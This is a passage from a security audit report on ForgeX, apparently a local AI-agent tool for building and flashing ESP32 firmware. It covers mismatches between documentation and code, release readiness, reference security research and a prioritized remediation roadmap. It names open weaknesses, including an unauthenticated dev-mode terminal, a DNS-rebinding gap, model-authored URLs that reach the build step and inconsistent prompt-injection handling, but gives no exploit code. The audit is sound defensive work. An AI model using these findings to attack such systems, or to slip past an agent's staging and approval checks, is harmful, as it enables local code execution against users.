12. **Provider errors classified correctly:** 401/403 non-retryable on every path checked; streams wrapped in `aclosing`/`async with` everywhere; `_validate_generated_plan` re-checks `allowed_tools` and path safety server-side.
13. **ChangeSet apply path is strong:** tamper/conflict checks, `expected_artifact_hash` semantics in `action_binding.py`, the `prepare_flash`/`confirm_flash` pattern — this is the architecture to *extend* (XM-1), not replace.
14. **Flash pre-write controls that exist:** port must match detected board, per-board suffix allowlist, post-build size-drift rejection, empty-file rejection, `verify` defaults True.
15. **Guarded paths elsewhere are correct:** task-id format validated at schema *and* route; `hub.begin` prevents id reuse; file guard `_guard_workspace_path`/`_external_target` in `files.py` is the reference implementation EXE-1 should copy.

---

## PART 5 — DOCUMENTATION vs CODE

| Claim | Doc | Reality |
|---|---|---|
| V3 flag rejected | docs say `FORGEX_ENABLE_AGENT_V3_LOOP` is rejected/absent | `app.py:265-268` reads it |
| `NEXT_PUBLIC_FORGEX_UI_V4` | referenced in docs | dead — no consumer |
| Alt+Space / Ctrl+Shift+F shortcuts | documented | not implemented (two competing Ctrl+K handlers instead — FE-F16) |
| "Includes Codex" | README claim | no Codex integration exists |
| Gate area count | doc lists N areas | `verify:beta` runs 6 checks |
| NVIDIA 45 s deadline / 60 s turn budget | `README.md:114-118` | **120 s / 300 s** in `core/config.py:23,92-97` + `product_provider_registry.py:169` (ML-H-4) |
| `PYTHONPATH` blocked | `subprocess_mgr.py:948-951` docstring | `PYTHONPATH` **is** in the allowlist (`:155-170`) (PROC-2) |
| SIGTERM to process *group* | `subprocess_mgr.py:10,818-831` | Windows branch terminates direct child only (PROC-1) |
| "trusted tool output" vs untrusted project text | two planners disagree (ML-M-3) | injection posture inconsistent |
| Re-confirmation on weak device binding | `orchestrator.py:1928-1933` docstring | never triggered (OR-F7) |

**Action:** fix docs to match code where code is intentional (120/300 s), fix code to match docs where the doc states the security intent (`PYTHONPATH`, tree-kill), delete the dead claims (`NEXT_PUBLIC_FORGEX_UI_V4`, Codex, gate count).

---

## PART 6 — RELEASE READINESS vs `BETA_READINESS.md`

`BETA_READINESS.md` is the declared release contract. Measured against it:

| Contract item | Status |
|---|---|
| Line 44 — installer sign-off | ❌ **No packaging config exists** (no electron-builder/forge in repo). `EF-F09` confirms nothing in-repo can verify the real build pipeline. `signoff:esp32` exists but needs `.venv` present. |
| Line 45 — zero dependency vulnerabilities | ❌ **Contradicted by the repo's own record:** `docs/REPOSITORY_REVIEW_2026-09-06.md:22-24` — root npm 2 high/2 critical; frontend 7 high/2 moderate; pip-audit 8 advisories. |
| `npm run verify:beta` (6 checks, aborts on first failure) | ⚠️ **Never executed during this review** — actual pass/fail state unknown. This is the single most important unknown remaining. |
| Release scanner completeness | ⚠️ `scripts/scan-release-content.mjs` missing rules for `*.log`, `*.png`, `.promptforge/`, `.forgex-context-*`. |
| Security sign-off | ❌ Blocked by the 4 Criticals + TERM-1 (unauthenticated terminal in dev mode is the worst realistic local attack). |
| Test evidence | ⚠️ ~1089 static `def test_` backend, 63 ui-state, harness 9, electron 29 — counted, not executed. Known blind spot: `FakeRuntime` has no yield-in-finally so SER-1 is untested by construction. |

**Industry reference (2026 release-readiness checklists):** standard blocking gates are (a) dependency vulnerability scan with *no critical open issues*, (b) SAST/DAST integrated and passing, (c) 100% secrets management — no plaintext credentials, (d) SBOM generation, (e) signing + approval evidence, (f) automated go/no-go thresholds (pass rate, open blocking defects). `BETA_READINESS.md` *claims* (a), (c), (e); the recorded audits fail (a), the credential layer is actually good on (c) (verified — only the JSON writer lacks the guard, ML-M-2), and (e) has no config. **The doc's standards are right; the evidence doesn't back them. Fix the evidence, not the standard.**

---

## PART 7 — REFERENCE SYSTEMS (external research)

Six searches, synthesized into what ForgeX should copy or avoid:

**1. Agent sandbox architectures (2026 market).** The market has split: cloud agents (OpenAI Codex — a sandboxed VM per task, repo clone, configured environment, PR output) vs local agents (Cursor, Claude Code, Aider — run on your machine with real-time streaming). The safety differentiator is *task isolation*: Codex isolates per task in a VM; local tools inherit the whole machine. **ForgeX's staged workspace + ChangeSet review is the local equivalent of per-task isolation and is the right architecture** — but EXE-1 (client-chosen cwd) and AF-F1 (model-authored `platform` URL) pierce the stage from two directions. The principle to enforce: *every input that reaches build/flash must be stage-derived*.

**2. MCP / agent authorization (June 2025 spec + 2026 practice).** The production pattern is: protocol discovery + OAuth/OIDC identity + **short-lived, audience-bound access tokens** + per-tool authorization + **human approval for high-risk side effects** + secret storage outside model context + audit logs preserving who acted on whose behalf. **ForgeX's one-time approval + action binding + artifact-hash audience-binding is exactly the "human approval for high-risk side effects" pattern, done right** — better than most. The gaps are consistency, not design: XM-1 (a route that skips it), OR-F6 (self-issued/self-validated grants), EF-F15 (bearer sent before server proves possession → use a challenge).

**3. Electron security guides.** "Assume the renderer is compromised — validate everything." Checklist: three pillars (✅ ForgeX has all three), minimal preload (✅ six typed invokes), **IPC treated as an untrusted boundary with sender-origin checks (❌ EF-F10)**, **CSP (❌ EF-F06/FE-F12)**, tokens held in main and encrypted with `safeStorage` (❌ EF-F14 — ForgeX puts the harness token in `process.env`, visible to every child and the renderer), `npm audit` regularly (❌ release contract vs recorded findings).

**4. Local-service auth (FastAPI/uvicorn).** Uvicorn defaults to binding `127.0.0.1` — binding is the first control; **Host-header validation is the required second control against DNS rebinding**, and token auth the third. Reference guidance: fail closed, validate always. ForgeX has the right function (`_validate_host`, `_validate_origin`) but gates Host on token presence (TERM-1) and ignores port (XM-2) → **make both unconditional, before anything else in Part 8.**

**5. esptool flash safety (Espressif docs).** esptool itself "checks every binary before flashing. If a valid firmware image is detected, the `Chip ID` and `Minimum chip revision` fields in its header are compared against the actually connected chip… flashing is stopped" (overridable only with `--force`). Merged images are written at `0x0` **by construction**; app images at `0x10000`. Implications: (a) FLASH-3 — esptool gives chip-compat for free *if* ForgeX doesn't defeat it with `--force` or a wrong `--chip`; ForgeX still needs its own size-vs-flash and image-magic checks; (b) FLASH-2 — stop guessing offsets from filename tokens; detect merged images by content (magic `0xE9` at 0x0 **and** app magic at `0x10000`) and *refuse ambiguity* rather than guess, matching esptool's fail-closed posture.

**6. Release readiness (2026 checklists).** See Part 6 — the operative rule: **gates must be executable evidence, not prose.** Every claim in `BETA_READINESS.md` should map to a command in `verify:beta` that can fail.

---

## PART 8 — PRIORITIZED ROADMAP

### Phase 0 — Close the local-RCE/auth surface (days; blocks any beta)
1. **EXE-1** — containment on `workspace_root` at schema + `_context_from_task` + `_validate_project` (copy `files.py:_guard_workspace_path`).
2. **AF-F1** — `build_policy.py` `platform`/`lib_deps` allowlist (fail closed).
3. **TERM-1 + XM-2** — always validate Host/strict Origin incl. port; fail closed with no token (ephemeral mint or `503` on terminal/execute/build/flash/monitor).
4. **XM-1** — `POST /flash` through binding + one-time approval (or disable in desktop mode, documented).
5. **EF-F01** — frontend identity proof; no packaged-build fallback to `:3000`.
6. **OR-F9** — transaction lock try/finally (one-line permanent-deadlock fix).

### Phase 1 — Run integrity & data loss (days)
OR-F20/F21/F22 (stuck runs, ghost workers), AF-F2 (stage `rmtree` on transient error), AF-F3 (subagent build escalation), SER-1 (yield-in-finally), OR-F1 + OR-F2/F3 (route auth coverage), EF-F14/F15 (token env leak, bearer-to-stranger).

### Phase 2 — Secrets, injection, hardware safety (1–2 weeks)
ML-H-1/H-2/H-3/H-5 + ML-M-1/M-2 (key/leak/injection), FE-F2/F3/F5/F12 (stuck UI, status regression, localStorage paths, headers), FLASH-1/2/3 + CMD-1 (path containment, content-based offset, pre-write header check, TCL quoting), EF-F06 CSP, TERM-3 env strip, EXE-5 redaction, OR-F4/F5 (approval invalidation + re-issue), PROC-1/2 (Job Objects, allowlist trim).

### Phase 3 — Redesigns (2–4 weeks, after Phase 0–2 are green)
1. Shared **TurnEngine** (AF-F15) — highest leverage; eliminates a whole defect class.
2. Delete `ApiPlannerProvider` dead stack (ML-M-12) + admission asyncio (ML-M-8).
3. Terminal session ownership (TERM-2) + WS same-origin auth (FE-F1).
4. HMAC challenge for backend/harness probes (EF-F16/F20) + Job Objects (EF-F20).
5. Router-level `Depends` for auth (XM-3).
6. God-module splits — orchestrator (OR-A1/A2/A3), then execution-layer seams (`AUDIT_PROCESS_SERIAL_BUILD.md §8`). Do these *last*; splitting before the fixes land multiplies churn.
7. Decide the orphan-components question (FE-F10): delete or wire.

### Phase 4 — Release gate (parallel from day 1)
1. **Run `npm run verify:beta` and record the real result** — the biggest unknown.
2. Add dependency audits (npm + pip-audit) as *failing* checks; reconcile with `docs/REPOSITORY_REVIEW_2026-09-06.md`.
3. Add packaging config (electron-builder/forge) or strike the installer claim.
4. Extend the release scanner (`*.log`, `*.png`, `.promptforge/`, `.forgex-context-*`).
5. Correct the doc-vs-code table in Part 5.
6. Fix the test blind spot that hid SER-1 (real-generator `aclose()` test).

---

### Findings by stream

| Stream | Critical | High | Medium | Low | Total |
|---|---|---|---|---|---|
| Auth/approval seams (direct read) | 0 | 1 (XM-1) | 1 | 0 | 2 |
| Orchestrator + routes + store | 1 | 4 | 13 | 7 | 25 |
| Model/provider layer | 0 | 5 | 11 | 8 | 24 |
| Process/serial/build | 1 | 2 | 13 | 17 | 33 |
| Frontend | 0 | 3 | 11 | 8 | 22 |
| Electron | 1 | 5 | 13 | 13 | 32 |
| Agent V3 loop | 1 | 2 | 7 | 7 | 17 |
| **Total** | **4** | **22** | **69** | **60** | **155** + 10 doc/release items |
